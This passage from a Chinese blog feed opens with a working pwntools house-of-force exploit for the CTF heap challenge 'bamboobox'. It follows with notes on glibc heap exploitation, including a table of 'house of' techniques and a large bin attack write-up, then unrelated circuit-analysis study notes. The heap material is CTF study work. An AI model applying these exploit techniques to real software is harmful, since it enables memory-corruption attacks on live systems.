class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(pt, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">pt = process(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;32&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;80&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x28</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">debug()</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;-96&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;16&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,p64(<span class="number">0x0000000000400d49</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt.interactive()</span><br></pre></td></tr></table></figure><h3 id="The-House-of-Orange"><a href="#The-House-of-Orange" class="headerlink" title="The House of Orange"></a>The House of Orange</h3><p>size&lt;&#x3D;128k(mmap)</p><p>页对齐4kb(0x1000)</p><h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h3><p>针对检测key</p><ul><li>tcache填满</li><li>A进入unsorted bin，b随后，大小为tcache,合并</li><li>释放一个tcache</li><li>free B</li></ul><h3 id="Overwrite-Fastbin"><a href="#Overwrite-Fastbin" class="headerlink" title="Overwrite Fastbin"></a>Overwrite Fastbin</h3><table><thead><tr><th>攻击方法</th><th>影响范围</th><th>学习链接</th></tr></thead><tbody><tr><td>house of spirit</td><td>2.23—— 至今</td><td>堆利用系列之 house of spirit - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of einherjar</td><td>2.23—— 至今</td><td>PWN——House Of Einherjar CTF Wiki 例题详解 - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of force</td><td>2.23——2.29</td><td>Top chunk 劫持：House of force 攻击 - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of lore</td><td>2.23—— 至今</td><td>House of Lore - CTF Wiki (ctf-wiki.org)</td></tr><tr><td>house of orange</td><td>2.23——2.26</td><td>House of orange - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of rabbit</td><td>2.23——2.28</td><td><a href="http://p4nda.top/2018/04/18/house-of-rabbit/">http://p4nda.top/2018/04/18/house-of-rabbit/</a></td></tr><tr><td>house of roman</td><td>2.23——2.29</td><td>House of Roman - CTF Wiki (ctf-wiki.org)</td></tr><tr><td>house of storm</td><td>2.23——2.29</td><td>House of storm 原理及利用 - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of corrosion</td><td>2.23—— 至今</td><td>House-of-Corrosion 一种新的堆利用技巧 - 先知社区 (aliyun.com)</td></tr><tr><td>house of husk</td><td>2.23—— 至今</td><td>house-of-husk 学习笔记 - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of atum</td><td>2.26——2.30</td><td><a href="https://abf1ag.github.io/2021/06/11/house-of-atum/">https://abf1ag.github.io/2021/06/11/house-of-atum/</a></td></tr><tr><td>house of kauri</td><td>2.26——2.32</td><td>Overview of GLIBC heap exploitation techniques (0x434b.dev)</td></tr><tr><td>house of fun</td><td>2.23——2.30</td><td>Overview of GLIBC heap exploitation techniques (0x434b.dev)</td></tr><tr><td>house of mind</td><td>2.23—— 至今</td><td>how2heap&#x2F;house_of_mind_fastbin.c at master · shellphish&#x2F;how2heap (github.com)</td></tr><tr><td>house of muney</td><td>2.23—— 至今</td><td>House of Muney 分析 - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of botcake</td><td>2.23—— 至今</td><td>奇安信攻防社区 - 深入理解 House of Botcake 堆利用手法 (butian.net)</td></tr><tr><td>house of rust</td><td>2.26—— 至今</td><td>c4ebt&#x2F;House-of-Rust</td></tr><tr><td>house of crust</td><td>2.26——2.37</td><td>c4ebt&#x2F;House-of-Rust</td></tr><tr><td>house of io</td><td>2.26—— 至今</td><td>Overview of GLIBC heap exploitation techniques (0x434b.dev)</td></tr><tr><td>house of banana</td><td>2.23—— 至今</td><td>house of banana - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of kiwi</td><td>2.23——2.36</td><td>House OF Kiwi - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of emma</td><td>2.23—— 至今</td><td>house of emma</td></tr><tr><td>house of pig</td><td>2.23—— 至今</td><td>house of pig 一个新的堆利用详解 - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of obstack</td><td>2.23—— 至今</td><td>一条新的 glibc IO_FILE 利用链：_IO_obstack_jumps 利用分析 - 跳跳糖 (tttang.com)</td></tr><tr><td>house of apple1</td><td>2.23—— 至今</td><td>House of Apple 一种新的 glibc 中 IO 攻击方法 (1) - roderick - record and learn! (roderickchan.cn)</td></tr><tr><td>house of apple2</td><td>2.23—— 至今</td><td>House of Apple 一种新的 glibc 中 IO 攻击方法 (2) - roderick - record and learn! (roderickchan.cn)</td></tr><tr><td>house of apple3</td><td>2.23—— 至今</td><td>House of Apple 一种新的 glibc 中 IO 攻击方法 (3) - roderick - record and learn! (roderickchan.cn)</td></tr></tbody></table><h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h1><h1 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h1><h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><p>0x200000</p><h2 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们修改了<code>p1</code>的<code>bk_nextsize</code>为<code>[target-0x20]</code>,也就导致了<code>victim-&gt;bk_nextsize = (&amp;target)-4)</code></p><p>然后执行<code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code>也就是<code>(&amp;target)-4)-&gt;fd_nextsize = victim</code> ,相当于<code>*target = victim</code> 就在<code>target</code>处写上了新入<code>large bin</code>的<code>p2</code>的地址</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电路稳态分析</title>
      <link href="/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90/"/>
      <url>/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="正弦稳态"><a href="#正弦稳态" class="headerlink" title="正弦稳态"></a>正弦稳态</h1><h2 id="正弦电压电流的相量表示"><a href="#正弦电压电流的相量表示" class="headerlink" title="正弦电压电流的相量表示"></a>正弦电压电流的相量表示</h2><p>$$<br>u(t)&#x3D;U_m\cos(wt+\psi)&#x3D;Re[\dot{U_m}e^{jw t}]<br>$$</p><p>$$<br>\dot{U_m}&#x3D;U_me^{j\psi}&#x3D;U_m\angle\psi<br>$$</p><p>由<strong>欧拉公式</strong><br>$$<br>\cos \theta + j\sin \theta&#x3D;e^{j\theta}<br>$$<br>有<br>$$<br>Re[\dot{U_m}e^{jw t}]&#x3D;U_m\cos[wt+\psi]<br>$$</p><p>$$<br>Im[\dot{U_m}e^{jw t}]&#x3D;U_m\sin[wt+\psi]<br>$$</p><p>$$<br>u(t)&#x3D;U_m\cos(wt+\psi)\longleftrightarrow\dot{U_m}&#x3D;U_m\angle\psi<br>$$</p><blockquote><p><strong>一一对应</strong>的关系，表示每一个正弦波都可以由一个相量表示</p></blockquote><p>微分——代数</p><p>时域——频域</p><h3 id="广义欧姆定律"><a href="#广义欧姆定律" class="headerlink" title="广义欧姆定律"></a>广义欧姆定律</h3><h4 id="capacitor"><a href="#capacitor" class="headerlink" title="capacitor"></a>capacitor</h4><p>$$<br>V_C&#x3D;Z_CI_C<br>$$</p><p>$$<br>Z_C&#x3D;\frac{1}{jwC}<br>$$</p><blockquote><p>此处$ j $的含义：欧拉公式代入$ \frac{\pi}{2} $得到$ j&#x3D;e^{j\frac{\pi}{2}} $ ，故可体现电流超前电压90°</p></blockquote><h4 id="inductor"><a href="#inductor" class="headerlink" title="inductor"></a>inductor</h4><p>$$<br>V_I&#x3D;Z_II_I<br>$$</p><p>$$<br>Z_I&#x3D;jwL<br>$$</p><h4 id="resistor"><a href="#resistor" class="headerlink" title="resistor"></a>resistor</h4><p>$$<br>u\space know<br>$$</p><h3 id="Tips-复数运算"><a href="#Tips-复数运算" class="headerlink" title="Tips.复数运算"></a>Tips.复数运算</h3><p><strong>乘法</strong>：模相乘，角相加</p><p><strong>除法</strong>：模相除，角相减</p><h3 id="传递函数"><a href="#传递函数" class="headerlink" title="传递函数"></a>传递函数</h3><p>系统函数，网络输出复幅值与输入复幅值的比值<br>$$<br>H(jw)&#x3D;\frac{\dot{U}_2}{\dot{U}_1}&#x3D;|H(jw)|\angle \theta(w)<br>$$</p><p>其中<br>$$<br>|H(jw)|&#x3D;\frac{U_2}{U_1}<br>$$</p><p>$$<br>\theta(w)&#x3D;\psi_2-\psi_1<br>$$</p><h3 id="频率响应"><a href="#频率响应" class="headerlink" title="频率响应"></a>频率响应</h3><p>幅值和相位作为频率的函数的图形</p><p>幅频响应 + 相频响应 &#x3D; 波特图</p><p><del>（考试画大致幅频图）</del></p><h3 id="e-g-RL电路"><a href="#e-g-RL电路" class="headerlink" title="e.g.RL电路"></a>e.g.RL电路</h3><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521230513617.png" alt="image-20230521230513617"><br>$$<br>V_o&#x3D;\frac{R}{R+Ls}V_i<br>$$</p><p>$$<br>H(jw)&#x3D;\frac{V_o}{V_i}&#x3D;\frac{R}{R+sL}<br>$$</p><p>$$<br>when\space W_0&#x3D;\frac{R}{L}&#x3D;\frac{1}{\tau},H&#x3D;\frac{1}{\sqrt{2}}<br>$$</p><p>$$<br>\lg H&#x3D;\lg\frac{w_0}{\sqrt{w_0^2+w^2}}<br>$$</p><p>$$<br>when\space w\gg w_0,20\lg H&#x3D;-20\lg\frac{W}{W_0}<br>$$</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521231014421.png" alt="image-20230521231014421"></p><p><strong>波特图：</strong>$20\lg|H(jw)|$和$\theta(w)$相对于对数频率坐标的特性曲线。纵坐标用dB作为单位</p><p>另：</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521232047380.png" alt="image-20230521232047380"></p><h2 id="一阶RC-RL电路频率响应近似折线图"><a href="#一阶RC-RL电路频率响应近似折线图" class="headerlink" title="一阶RC&#x2F;RL电路频率响应近似折线图"></a>一阶RC&#x2F;RL电路频率响应近似折线图</h2><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521232656917.png" alt="image-20230521232656917"></p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521232444210.png" alt="image-20230521232444210"></p><p>转折频率$w&#x3D;\frac{1}{RC}$低频渐近线高频渐近线转折频率处相移$45°$</p><h3 id="滤波器"><a href="#滤波器" class="headerlink" title="滤波器"></a>滤波器</h3><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192346957.png" alt="image-20230521192346957"></p><p><strong>n阶滤波器：</strong>$w$每上升10倍，下降20dB的n倍</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522130629436.png" alt="image-20230522130629436"></p><h2 id="放大器级间解耦（待）"><a href="#放大器级间解耦（待）" class="headerlink" title="放大器级间解耦（待）"></a>放大器级间解耦（待）</h2><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192352972.png" alt="image-20230521192352972"></p><h2 id="补偿电路（待）"><a href="#补偿电路（待）" class="headerlink" title="补偿电路（待）"></a>补偿电路（待）</h2><h2 id="阻抗中的功率与能量"><a href="#阻抗中的功率与能量" class="headerlink" title="阻抗中的功率与能量"></a>阻抗中的功率与能量</h2><h1 id="谐振电路"><a href="#谐振电路" class="headerlink" title="谐振电路"></a>谐振电路</h1><h2 id="RLC串联谐振电路"><a href="#RLC串联谐振电路" class="headerlink" title="RLC串联谐振电路"></a>RLC串联谐振电路</h2><p>$$<br>Z(jw)&#x3D;\frac{\dot{U}}{\dot{I}}&#x3D;R+j(wL-\frac{1}{wC})&#x3D;|Z(jw)|\angle\theta(w)<br>$$</p><h3 id="谐振条件"><a href="#谐振条件" class="headerlink" title="谐振条件"></a>谐振条件</h3><p>$$<br>w&#x3D;w_0&#x3D;\frac{1}{\sqrt{LC}}<br>$$</p><p>$w_0$称为电路<strong>固有谐振角频率</strong><br>$$<br>f&#x3D;f_0&#x3D;\frac{1}{2\pi\sqrt{LC}}<br>$$<br>RLC串联电路在谐振时感抗和容抗量值上相等，值为谐振电路的<strong>特性阻抗</strong><br>$$<br>\rho &#x3D;w_0L&#x3D;\frac{1}{w_0C}&#x3D;\sqrt{\frac{L}{C}}<br>$$</p><h3 id="谐振时电压电流"><a href="#谐振时电压电流" class="headerlink" title="谐振时电压电流"></a>谐振时电压电流</h3><p>$$<br>Z(jw)&#x3D;R<br>$$</p><p>阻抗呈纯电阻，达最小值</p><p>电流达最大值，且与电压源电压同相<br>$$<br>Q&#x3D;\frac{w_0L}{R}&#x3D;\frac{1}{w_0RC}&#x3D;\frac{\rho}{R}<br>$$<br>Q为串联谐振电路的<strong>品质因素</strong></p><p>各处电压：<br>$$<br>\dot{U}_R&#x3D;\dot{U}_S<br>$$</p><p>$$<br>\dot{U}_L&#x3D;jQ\dot{U}_S<br>$$</p><p>$$<br>\dot{U}_C&#x3D;-jQ\dot{U}_S<br>$$</p><h3 id="谐振时功率能量"><a href="#谐振时功率能量" class="headerlink" title="谐振时功率能量"></a>谐振时功率能量</h3><p>由于$u(t)&#x3D;u_L(t)+u_C(t)&#x3D;0$（相当于虚短路），任何时刻进入电感电容总瞬时功率为0，电压源发出的功率<strong>全部</strong>被电阻吸收</p><h3 id="谐振电路的频率特性"><a href="#谐振电路的频率特性" class="headerlink" title="谐振电路的频率特性"></a>谐振电路的频率特性</h3><p>串联谐振电路</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522170355601.png" alt="image-20230522170355601"><br>$$<br>|H(jw)|&#x3D;\frac{1}{\sqrt{1+Q^2(\frac{w}{w_0}-\frac{w_0}{w})^2}}<br>$$<br>当$w&#x3D;w_0&#x3D;\frac{1}{\sqrt{LC}}$电路发生谐振，达最大值，电路有<strong>带通滤波特性</strong></p><p>$|H(jw)|&#x3D;\frac{1}{\sqrt{2}}$，即-3dB时，带宽：$\Delta w&#x3D;\frac{w_0}{Q}&#x3D;2\alpha&#x3D;\frac{1}{\tau}$</p><p>故带宽$\Delta w$与品质因素$Q$成反比，通带越窄，曲线越尖锐，对信号选择性越好</p><p><strong>通用谐振曲线</strong>（横纵坐标都是相对量）</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522171539550.png" alt="image-20230522171539550"></p><p>当$w&#x3D;w_+\space or\space w_-$时，$|H(jw)|&#x3D;0.707(-3dB),\theta &#x3D;\pm 45^。$</p><h2 id="RLC并联谐振电路"><a href="#RLC并联谐振电路" class="headerlink" title="RLC并联谐振电路"></a>RLC并联谐振电路</h2><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522172056625.png" alt="image-20230522172056625"></p><p>懒得写了，怎么回事呢:shit:</p><p>累了😑️，学个模电先</p>]]></content>
      
      
      <categories>
          
          <category> ESE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 电路分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态电路及瞬态分析</title>
      <link href="/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90/"/>
      <url>/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<blockquote><p>$V_D$表大DC，$v_D$表全信号，$v_d$表小AC</p><p>热电压常数$V_T&#x3D;\frac{k}{q}T$在常温(27度)默认为26mV</p><p>$V_S$域值电压$V_{TH}$为BJT重要参数</p></blockquote><h1 id="电容-电感"><a href="#电容-电感" class="headerlink" title="电容&amp;电感"></a>电容&amp;电感</h1><h2 id="电容"><a href="#电容" class="headerlink" title="电容"></a>电容</h2><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><p>$$<br>q&#x3D;CU<br>$$</p><p>$$<br>i(t)&#x3D;\frac{dq}{dt}&#x3D;C\frac{du}{dt}<br>$$</p><p>$$<br>u_c(t)&#x3D;\frac{1}{C}\int_{-\infty}^0i(\xi)d\xi+\frac{1}{C}\int^t_0i(\xi)d\xi<br>$$</p><h3 id="电压的记忆性"><a href="#电压的记忆性" class="headerlink" title="电压的记忆性"></a>电压的记忆性</h3><p>峰值检测器电路</p><h3 id="电压的连续性"><a href="#电压的连续性" class="headerlink" title="电压的连续性"></a>电压的连续性</h3><p>电容电流<strong>有界</strong>时，电压不能突变</p><h3 id="储能"><a href="#储能" class="headerlink" title="储能"></a>储能</h3><p>$$<br>p(t)&#x3D;u(t)C\frac{du}{dt}<br>$$</p><p>$$<br>W(t_0,t)&#x3D;\int_{t_0}^tp(\xi)d\xi&#x3D;\frac{1}{2}C[u^2(t)-u^2(t_0)]<br>$$</p><p>若初始储能为0，则任意时刻能量：<br>$$<br>W(t)&#x3D;\frac{1}{2}Cu^2(t)<br>$$<br>某时刻电容储能只取决于<strong>电压</strong>，与电流无关</p><h3 id="串并联"><a href="#串并联" class="headerlink" title="串并联"></a>串并联</h3><p>并联变大，串联变小</p><h2 id="电感"><a href="#电感" class="headerlink" title="电感"></a>电感</h2><h3 id="模型-1"><a href="#模型-1" class="headerlink" title="模型"></a>模型</h3><p>$$<br>\psi &#x3D;Li<br>$$</p><p>$$<br>u(t)&#x3D;\frac{d\psi}{dt}&#x3D;L\frac{di}{dt}<br>$$</p><p>$$<br>i(t)&#x3D;\frac{1}{L}\int_{-\infty}^0u(\xi)d\xi+\frac{1}{L}\int_0^tu(\xi)d\xi<br>$$</p><h3 id="电流的记忆性"><a href="#电流的记忆性" class="headerlink" title="电流的记忆性"></a>电流的记忆性</h3><h3 id="电流的连续性"><a href="#电流的连续性" class="headerlink" title="电流的连续性"></a>电流的连续性</h3><h3 id="储能-1"><a href="#储能-1" class="headerlink" title="储能"></a>储能</h3><p>$$<br>p(t)&#x3D;i(t)L\frac{di}{dt}<br>$$</p><p>$$<br>w(t_0,t)&#x3D;\frac{1}{2}L[i^2(t)-i^2(t_0)]<br>$$</p><p>某时刻电容储能只取决于<strong>电流</strong>，与电感无关</p><h3 id="串并联-1"><a href="#串并联-1" class="headerlink" title="串并联"></a>串并联</h3><p>并联变小，串联变大</p><h1 id="一阶电路的暂态过程"><a href="#一阶电路的暂态过程" class="headerlink" title="一阶电路的暂态过程"></a>一阶电路的暂态过程</h1><h2 id="全响应-三要素法（仅限直流激励一阶）"><a href="#全响应-三要素法（仅限直流激励一阶）" class="headerlink" title="全响应-三要素法（仅限直流激励一阶）"></a>全响应-三要素法（仅限直流激励一阶）</h2><p>$$<br>f(t)&#x3D;[f(0_+)-f(\infty)]e^{-\frac{t}{\tau}}+f(\infty)\space (t\geq0)<br>$$</p><blockquote><p>全响应 &#x3D; 固有响应（瞬态响应） + 强制响应（稳态响应）</p><p>注意：<strong>非直流激励</strong>下，固有响应<strong>不等于</strong>瞬态响应，稳态响应<strong>不等于</strong>稳态响应</p><p>瞬态响应：随t变化固有响应：由内部电路原本状态引起的变化</p></blockquote><p>$$<br>f(t)&#x3D;f(0_+)e^{-\frac{t}{\tau}}+f(\infty)(1-e^{-\frac{t}{\tau}})\space(t\geq 0)<br>$$</p><blockquote><p>全响应 &#x3D; 零输入响应 + 零状态响应</p></blockquote><p>$$<br>\tau&#x3D;R_0C\space or\space\tau&#x3D;\frac{L}{R_0}<br>$$</p><p>$\tau$ 具有时间但量纲，称为RC电路的<strong>时间常数</strong></p><p>一般用$3\tau$ 法判断放电过程结束，即90%</p><p>计算R时，电容用<strong>戴维宁等效</strong>，电感用<strong>诺顿等效</strong></p><h3 id="warning-注意"><a href="#warning-注意" class="headerlink" title=":warning:注意"></a>:warning:注意</h3><p>电容电路里，电流<strong>可以跃变</strong>；电感电路里，电压<strong>可以跃变</strong></p><p>注意表达式范围是否包含0</p><h2 id="包含开关序列的直流一阶电路"><a href="#包含开关序列的直流一阶电路" class="headerlink" title="包含开关序列的直流一阶电路"></a>包含开关序列的直流一阶电路</h2><h3 id="阶跃函数"><a href="#阶跃函数" class="headerlink" title="阶跃函数"></a>阶跃函数</h3><p>$$<br>\varepsilon(t)&#x3D;\begin{cases}<br>0 &amp; t&lt;0\\<br>1 &amp; t&gt;0<br>\end{cases}<br>$$</p><p>引入阶跃电流源和阶跃电压源可以省去电路中的开关，可以应用叠加定理计算电路的零状态响应</p><h3 id="阶跃响应"><a href="#阶跃响应" class="headerlink" title="阶跃响应"></a>阶跃响应</h3><p>单位阶跃信号作用下电路的<strong>零状态响应</strong>，用$s(t)$表示</p><p>已知电路的阶跃响应，利用<strong>叠加定理</strong>易得任意分段恒定信号激励下线性时不变电路的零状态响应</p><h3 id="冲激函数"><a href="#冲激函数" class="headerlink" title="冲激函数"></a>冲激函数</h3><p>一个无界信号$\delta(t)$为<strong>单位冲激函数</strong>当且仅当<br>$$<br>\begin{cases}<br>\delta(t)&#x3D;\begin{cases}<br>        奇异值&amp;t&#x3D;0\\<br>        0&amp;t\neq 0<br>    \end{cases}\\<br>    \int_{-\varepsilon_2}^{\varepsilon_1}\delta(t)dt&#x3D;1&amp;\varepsilon_1&gt;0,\varepsilon_2&gt;0<br>\end{cases}<br>$$<br>单位阶跃函数与单位冲激函数间存在关系<br>$$<br>\delta(t)&#x3D;\frac{d\varepsilon(t)}{dt}<br>$$</p><p>$$<br>\varepsilon(t)&#x3D;\int^t_{-\infty}\delta(\xi)d\xi<br>$$</p><h3 id="冲激响应"><a href="#冲激响应" class="headerlink" title="冲激响应"></a>冲激响应</h3><p>单位冲激信号作用下电路的<strong>零状态响应</strong>，表示为$h(t)$</p><p>可先求出$s(t)$，对时间求导</p><h1 id="二阶电路的暂态过程"><a href="#二阶电路的暂态过程" class="headerlink" title="二阶电路的暂态过程"></a>二阶电路的暂态过程</h1><blockquote><p>仅讨论含两个动态原件的线性二阶电路</p></blockquote><h2 id="RLC串联电路的零输入响应"><a href="#RLC串联电路的零输入响应" class="headerlink" title="RLC串联电路的零输入响应"></a>RLC串联电路的零输入响应</h2><p>常系数非齐次线性二阶微分方程:<br>$$<br>LC\frac{d^2u_c}{dt^2}+RC\frac{du_c}{dt}+u_c&#x3D;u_s(t)<br>$$<br>电路微分方程的特征根（电路的<strong>固有频率</strong>）:<br>$$<br>s_{1,2}&#x3D;-\frac{R}{2L}\pm\sqrt{(\frac{R}{2L})^2-\frac{1}{LC}}<br>$$</p><ol><li>$R&gt;2\sqrt{\frac{L}{C}}$ ，$s_{1,2}$为不相等实根，<strong>过阻尼情况</strong></li><li>$R&#x3D;2\sqrt{\frac{L}{C}}$ ，$s_{1,2}$为相等实根，<strong>临界阻尼情况</strong></li><li>$R&lt;2\sqrt{\frac{L}{C}}$ ，$s_{1,2}$共轭复数根，<strong>欠阻尼情况</strong></li></ol><blockquote><p>对R来说，越大越不易震荡，R趋近$\infty$时开路；越小越易震荡，R为0时为LC震荡电路</p><p>L越大（L储能越大，$\frac{1}{2}L\Delta i^2$大，电流变化大）C越小（$q&#x3D;CU$电压变化越大），越容易震荡</p></blockquote><h3 id="过阻尼"><a href="#过阻尼" class="headerlink" title="过阻尼"></a>过阻尼</h3><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192230226.png" alt="image-20230521192230226"></p><h3 id="临界阻尼"><a href="#临界阻尼" class="headerlink" title="临界阻尼"></a>临界阻尼</h3><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192259513.png" alt="image-20230521192259513"></p><h3 id="欠阻尼"><a href="#欠阻尼" class="headerlink" title="欠阻尼"></a>欠阻尼</h3><p>$$<br>s_{1,2}&#x3D;-\frac{R}{2L}\pm\sqrt{(\frac{R}{2L})^2-\frac{1}{LC}}&#x3D;-\alpha\pm j\sqrt{w_0^2-\alpha^2}&#x3D;-\alpha\pm jw_d<br>$$</p><p>衰减因子$\alpha&#x3D;\frac{R}{2L}$，因为RCL串联电路震荡快慢由i决定，故用电感时间常数，等于$\frac{1}{2\tau}$</p><p>无阻尼自然（谐振）频率$w_0&#x3D;\frac{1}{\sqrt{LC}}$</p><p>有阻尼自然频率$w_d&#x3D;\sqrt{w_0^2-\alpha^2}$</p><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192307785.png" alt="image-20230521192307785"></p><p>欠阻尼能量在<strong>电容与电感</strong>之间交换</p><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192313567.png" alt="image-20230521192313567"></p><h3 id="直流激励下RLC串联电路的响应"><a href="#直流激励下RLC串联电路的响应" class="headerlink" title="直流激励下RLC串联电路的响应"></a>直流激励下RLC串联电路的响应</h3><p>全响应由对应齐次微分方程通解与微分方程特解之和组成<br>$$<br>u_c(t)&#x3D;u_{Ch}(t)+u_{Cp}(t)<br>$$<br> $s_1\neq s_2$时<br>$$<br>u_c(t)&#x3D;K_1e^{s_1t}+K_2e^{s_2t}+U_S<br>$$<br>利用<br>$$<br>u_c(0),\frac{du_c(t)}{dt}\Bigg |_{t&#x3D;0}&#x3D;\frac{i_L(0)}{C}<br>$$<br>求解$K_1K_2$</p><h2 id="RLC并联电路的零输入响应"><a href="#RLC并联电路的零输入响应" class="headerlink" 